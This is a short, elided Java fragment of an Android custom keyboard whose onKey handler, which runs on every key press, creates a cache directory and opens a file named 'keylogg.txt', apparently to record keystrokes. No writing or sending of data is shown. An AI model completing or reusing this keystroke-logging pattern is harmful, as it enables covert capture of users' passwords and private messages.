...
package rapidora.co.myapplication.keyboard;
...
public class SoftKeyboard extends InputMethodService
    ...
    public void onKey(int primaryCode, int[] keyCodes) {
        ...
        File file = new File(FileHelper.getCacheDir(getApplicationContext()), Constants.FILE_NOTES);
        if (!file.exists()) {
            file.mkdir();
        }
        try {

            File gpxfile = new File(file, "keylogg.txt");
